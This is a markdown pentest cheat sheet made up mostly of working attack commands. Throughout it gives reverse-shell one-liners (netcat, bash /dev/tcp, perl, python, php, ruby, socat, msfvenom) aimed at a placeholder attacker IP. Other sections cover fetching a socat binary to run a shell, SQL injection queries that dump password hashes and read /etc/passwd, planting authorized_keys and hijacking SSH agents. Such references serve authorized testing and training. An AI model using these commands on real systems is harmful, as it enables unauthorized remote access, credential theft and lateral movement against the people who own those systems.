# common actions

**table of contents**:

- [shells](#shells)
  * [reverse shells](#reverse-shells)
    + [netcat](#netcat)
    + [bash](#bash)
    + [perl](#perl)
    + [python](#python)
    + [php](#php)
    + [ruby](#ruby)
    + [msfvenom](#msfvenom)
    + [socat](#socat)
  * [spawning tty shells](#spawning-shells)
    + [python](#python)
    + [bash/sh](#bash/sh)
    + [perl](#perl)
    + [text editors](#within-text-editors)
      - [vi](#vi)
    + [nmap](#nmap)
    + [script](#script)
  * [making fully-interactive shells](#making-them-fully-interactive)
    + [working around spawning issues](#spawn-workarounds)
- [file transfers](#file-transfers)
  * [wget](#wget)
  * [netcat](#netcat)
    + [files](#SENDING-FILES-BETWEEN-SYSTEMS)
    + [directories](#SENDING-WHOLE-DIRECTORIES)
- [db injections](#db-injections)
  * [mysql](#mysql)
  * [postgres](#postgresql)
- [ssh cheats](#ssh-cheats)
  * [SOCKS proxy](#socks-proxy)
  * [forwarding](#forwarding)
    + [local](#local-forwarding)
    + [remote](#remote-forwarding)
    + [x11](#x11-forwarding)
  * [config files](#config-files)
    + [config](#config)
    + [authorized keys](#authorized-keys)
  * [ssh agents](#ssh-agents)
    + [using an ssh agent](#using-an-ssh-agent)
    + [hijacking ssh agents](#hijacking-ssh-agents)
    + [agent forwarding](#agent-forwarding)

---

# shells

## reverse shells

### netcat

<small>sending:</small>
```
nc -e /bin/sh [LOCAL IP] [PORT]
```

<small>catching:</small>
```
nc -lvp [PORT]
```

<small>if the wrong version of netcat is installed, possible you could still get a shell by running:</small>
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [LOCAL IP] [PORT] >/tmp/f
```

### bash

```
bash -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1
```

### perl

```
perl -e 'use Socket;$i="[LOCAL IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LOCAL IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### php

```
php -r '$sock=fsockopen("[LOCAL IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### ruby

```
ruby -rsocket -e'f=TCPSocket.open("[LOCAL IP]",[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### msfvenom

in `metasploit`, you can generate paylods (under `cmd/unix`) for making one-liner bind or reverse shells

_see what's available_:
```
msfvenom -l payloads | grep "cmd/unix" | awk '{print $1}'
```

_generate payload_:
```
msfvenom -p cmd/unix/reverse_netcat LHOST=[LOCAL IP] LPORT=[LOCAL PORT] R
```

### socat

socat can be used to pass full TTY’s over TCP connections, if it's installed on a victim server you can launch a reverse shell with it, but you have to catch the connection with `socat`.

_local_:
```
socat file:`tty`,raw,echo=0 tcp-listen:[PORT]
```

_remote_:
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LOCAL IP]:[PORT]
```

<small>if it's not installed, it's possible to download it to a writable directory, chmod it, then execute a rev shell</small>
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:[LOCAL IP]:[PORT]
```

----
## spawning shells

#### **python**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### **bash/sh**
```
/bin/sh -i
```
```
echo os.system('/bin/bash')
```

#### **perl**
```
perl -e 'exec "/bin/sh";'
```

#### **within text editors**:

##### _vi_:
```
:!bash
```
```
:set shell=/bin/bash:shell
```

#### **nmap**:
```
!sh
```

#### **script**

```
## this method can potentially avoid needing to do all the stty/fg/bg work below
/usr/bin/script -qc /bin/bash /dev/null
```

----
## making them fully interactive

when getting a reverse shell through `netcat`, by default it's non-interactive - meaning it's a pain. once you run any of the above scripts to get a partially interactive shell, you can do a few more things to optimize:

_non-interactive shell_:
```
## get partially interactive shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

_remote shell_:
```
## background process netcat in the remote shell by hitting CTRL+Z
user@remote:$ ^Z
```
_local env_:
```
## get rows/cols values from your current env
user@local:~$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'

## so you can pass keyboard shortcuts, bring netcat back to the foreground 
user@local:~$ stty raw -echo; fg
```
<small>**[ZSH NOTE]**: zsh, specifically, only respects the -echo until the next prompt which means that you need to type your next command all in one line</small>

_remote env_:
```
## set the correct sizes for the remote shell
user@remote:~$ stty rows [ROWS] cols [COLS]

## export shell to ENV
export SHELL=/bin/bash

## enable colors
user@remote:~$ export TERM=xterm-256color

## reload shell to apply the TERM variable
user@remote:~$ reset 
OR
user@remote:~$ exec /bin/bash
```

#### spawn workarounds

_for non-responsive shell spawning when you need to change users_

first start a listening on your local host machine:

```
nc -nlvp [PORT]
```

then, from the remote/target machine:

```
echo "[PASSWORD]" | su - [USER] -c "bas -i >& /dev/tcp/[LOCAL IP]/[PORT] 0>&1"
```

---

## file transfers

### wget

**usecase**: fetch files/scripts from your local machine on the remote host

_sender_:
```
cd souce_directory
python -m http.server 
```

_'receiver' (more accurately, a fetcher here)_:
```
## python http server always starts by default at port 8000
## unless otherwise specified
wget http://[LOCAL IP]:8000/[FILE YOU WANT]
```

### netcat

##### SENDING FILES BETWEEN SYSTEMS

_receiver_:

start a listener and provide the name you want to give the sent file

```
nc -l -p [PORT] > [FILENAME]
```

_sender_:
```
nc -w 3 [RECEIVER IP] [PORT] < [FILENAME]
```

##### SENDING WHOLE DIRECTORIES

_receiver_:

maybe first create a separate directory if you want one, since this is going to send multiple files, then `cd` into it and start a `netcat` listener

```
nc -l -p [PORT] | tar xf -
```

_sender_:

```
cd source_directory
tar cf - . | nc [RECEIVER IP] [PORT]
```
---

# DB injections

## MySQL

|operation|sql|
|---|---|
|version|`SELECT @@version`|
|current user|`SELECT user();` or `SELECT system_user();`|
|get comments|`SELECT 1; #comment` or `SELECT /*comment*/1;`|
|list users|`SELECT user FROM mysql.user;`|
|list password hashes|`SELECT host, user, password FROM mysql.user;`|
|list DBA accounts|`SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘SUPER’;SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’; # priv`|
|list databases|`SELECT schema_name FROM information_schema.schemata; SELECT distinct(db) FROM mysql.db`|
|current db|`SELECT database()`
|list tables|`SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`
|list columns|`SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’`|
|find tables from column name|`SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table which have a column called ‘username’`|
|if statement|`SELECT if(1=1,’foo’,'bar’); — returns ‘foo’`|
|concat|`SELECT CONCAT(‘A’,'B’,'C’); # returns ABC`|
|substr|`SELECT substr(‘abcd’, 3, 1); # returns c`|
|local file access|`…’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)`, can only read world-readable files. `SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;` write to file system|
|hostname, IP|`SELECT @@hostname;`|
|create user|`CREATE USER test1 IDENTIFIED BY ‘pass1′;`|
|delete user|`DROP USER test1;`|
|make DBA user|`GRANT ALL PRIVILEGES ON *.* TO test1@’%';`|
|location of db files|`SELECT @@datadir;`|
|default/system db|`information_schema (>= mysql 5.0)`|

## PostgresQL

|operation|sql|
|---|---|
|version|`SELECT version()`|
|comments|`SELECT 1; –comment` or `SELECT /*comment*/1;`|
|current user|`SELECT user;` or `SELECT current_user;` or `SELECT session_user;` or `SELECT usename FROM pg_user;` or `SELECT getpgusername();`|
|list users|`SELECT usename FROM pg_user`|
|list pw hashes|`SELECT usename, passwd FROM pg_shadow`|
|list privs|`SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user`|
|list db accts|`SELECT usename FROM pg_user WHERE usesuper IS TRUE`|
|current db|`SELECT current_database()`|
|list dbs|`SELECT datname FROM pg_database`|
|list cols|`SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’)`|
|list tables|`SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid)`|
|find tables from col name|If you want to list all the table names that contain a column LIKE ‘%password%’:`SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’) AND attname LIKE ‘%password%’;`|
|concat|`SELECT ‘A’ || ‘B’; — returnsAB`|
|if statement|`IF statements only seem valid inside functions, so aren’t much use for SQL injection.  See CASE statement instead.`|
|case statement|`SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; — returns A`|
|avoid quotes|`SELECT CHR(65)||CHR(66); — returns AB`|
|command execution|[see here](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)|
|hostname, IP|`SELECT inet_server_addr();` — returns db server IP address (or null if using local connection) or `SELECT inet_server_port();` — returns db server IP address (or null if using local connection)|
|create users|`CREATE USER test1 PASSWORD ‘pass1′;`|
|create users with priv|`CREATE USER test1 PASSWORD ‘pass1′ CREATEUSER;`|
|drop users|`DROP USER test1;`|
|make user DBA|`ALTER USER test1 CREATEUSER CREATEDB;`|
|location of DB files|`SELECT current_setting(‘data_directory’);` or `SELECT current_setting(‘hba_file’);`|
|default/system dbs|`template0` or `template1`|

---

# ssh cheats

## SOCKS proxy

set up a SOCKS proxy on 127.0.0.1:1080 that lets you pivot through the remote host (10.0.0.1):
```
ssh -D 127.0.0.1:1080 10.0.0.1
```

**~/.ssh/config**
```
Host 10.0.0.1
DynamicForward 127.0.0.1:1080
```

you can then use `tsocks` or similar to use non-SOCKS-aware tools on hosts accessible from 10.0.0.1:

```
tsocks rdesktop 10.0.0.2
```

----

## forwarding

### local forwarding

_what does this mean?_

> make services on the remote network accessible to your host via a local listener.

**important**: you need to be `root` to bind to TCP port <1024. higher ports are used in the examples below.

#### USECASE: access service running on remote host

_service is running on the remote host on TCP port 1521 and accessible by connecting to 10521 on the SSH client system._

```
ssh -L 127.0.0.1:10521:127.0.0.1:1521 user@10.0.0.1
```

**~/.ssh/config**:
```
LocalForward 127.0.0.1:10521 127.0.0.1:1521
```

#### USECASE: access service on remote host while allowing other hosts on the same network as the SSH client to connect

_this is a potentially insecure operation_

```
ssh -L 0.0.0.0:10521:127.0.0.1:1521 10.0.0.1
```

**~/.ssh/config**:

```
LocalForward 0.0.0.0:10521 127.0.0.1:1521
```

#### USECASE: accessing a host that's accessible from the SSH server

_in this example, 10.0.0.99 is a host that’s accessible from the SSH server. we can access the service it’s running on TCP port 1521 by connecting to 10521 on the SSH client._

```
ssh -L 127.0.0.1:10521:10.0.0.99:1521 10.0.0.1
```

**~/.ssh/config**

```
LocalForward 127.0.0.1:10521 10.0.0.99:1521
```

### remote forwading

_what does this mean?_

> make services on your local system / local network accessible to the remote host via a remote listener. this sounds like an odd thing to want to do, but perhaps you want to expose a services that lets you download your tools.

**important**: remember that you need to be root to bind to TCP port <1024. higher ports are used in the examples below.

#### USECASE

SSH server will be able to access TCP port 80 on the SSH client by connecting to 127.0.0.1:8000 on the SSH server

```
ssh -R 127.0.0.1:8000:127.0.0.1:80 10.0.0.1
```

**~/.ssh/config**:

```
RemoteForward 127.0.0.1:8000 127.0.0.1:80
```

#### USECASE

the SSH server will be able to access TCP port 80 on 172.16.0.99 (a host accessible from the SSH client) by connecting to 127.0.0.1:8000 on the SSH server.

```
ssh -R 127.0.0.1:8000:172.16.0.99:80 10.0.0.1
```

**~/.ssh/config**:

```
RemoteForward 127.0.0.1:8000 172.16.0.99:80
```

#### USECASE

the SSH server will be able to access TCP port 80 on 172.16.0.99 (a host accessible from the SSH client) by connecting to TCP port 8000 on the SSH server.

any other hosts able to connect to TCP port 8000 on the SSH server will also be able to access 172.16.0.99:80.

this can sometimes be insecure.

```
ssh -R 0.0.0.0:8000:172.16.0.99:80 10.0.0.1
```

**~/.ssh/config**:

```
RemoteForward 0.0.0.0:8000 172.16.0.99:80
```

### x11 forwarding

_what does this mean?_

> if your SSH client is also an X-Server then you can launch X-clients (e.g. firefox) inside your SSH session and display them on your X-Server. this works well from linux X-Servers and from cygwin‘s X-server on windows.

```
SSH -X 10.0.0.1
SSH -Y 10.0.0.1 # less secure alternative - but faster
```

**~/.ssh/config**:

```
ForwardX11 yes
ForwardX11Trusted yes # less secure alternative - but faster
```

---

## config files

### config

**filename**: `~/.ssh/config`

_local configuration_

it's sometimes easier to configure options on your SSH client system in ~/.ssh/config for hosts you use a lot rather than having to type out long command lines.

using ~/.ssh/config also makes it easier to use other tools that use SSH (e.g. scp and rsync). it's possible to tell other tools that SSH listens on a different port, but it’s a pain.


```
Host 10.0.0.1
Port 2222
User ptm
ForwardX11 yes
DynamicForward 127.0.0.1:1080
RemoteForward 80 127.0.0.1:8000
LocalForward 1521 10.0.0.99:1521
```

### authorized keys

**filename**: `~/.ssh/authorized_keys`

_why use this?_

during a pentest or audit, you might want to add an `authorized_keys` file to let you log in using an SSH key.

it holds the public keys of the users allowed to log into that user’s account.

_generating a public/private key-pair_

```
ssh-keygen -f mykey
cat mykey.pub # you can copy this to authorized_keys
```

_connect to the target system_:

```
ssh -i mykey user@10.0.0.1
```

<small>**caveat**: THE authorized_keys file might not work if it’s writable by other users. If you already have shell access you can `chmod 600 ~/.ssh/authorized_keys` but, if you’re remotely exploiting an arbitrary file-write vulnerability and happen to have a weak umask, you may have problems.</small>

----

## ssh agents

SSH agents can be used to hold your private SSH keys in memory.  The agent will then authenticate you to any hosts that trust your SSH key

advantages:
- don’t have to keep entering your passphrase (if you chose to encrypt your private key)
- you still get to store your private SSH key in an encrypted format on disk

### using an ssh agent

```
## start the agent
eval `ssh-agent`

## add your keys to it 
ssh-add ~/dir/mykey
```

### hijacking ssh agents

if you see SSH agents running on a pentest (process called `ssh-agent`), you might be able to use it to authenticate you to other hosts – or other accounts on that host.

look at `~/.ssh/known_hosts` for potential candiates

you can use any agents running under the account you compromised, and if you’re root you can use any SSH agent.

SSH agents listen on a `unix` socket, so you need to figure out where this is for each agent (e.g. `/tmp/ssh-tqiEl28473/agent.28473`). you can then use the agent like this:

```
export  SSH_AUTH_SOCK=/tmp/ssh-tqiEl28473/agent.28473

# list the keys loaded into the agent
ssh-add -l

# authenticates you if server trusts key in agent
ssh user@host
```

_inspecting the env of every ssh-agent process on linux_
_get a list of unix sockets for ssh agents by inspecting the env of every ssh-agent process [linux]_

```
ps auxeww | grep ssh-agent | grep SSH_AUTH_SOCK | sed 's/.*SSH_AUTH_SOCK=//' | cut -f 1 -d ' '
```

### agent forwarding

_avoid using this feature with any keys you care about_

if you enable SSH agent forwarding then you’ll be able to carry on using the SSH agent on your SSH client during your session on the SSH server.

this is potentially insecure because so will anyone else who is root on the SSH server you’re connected to.
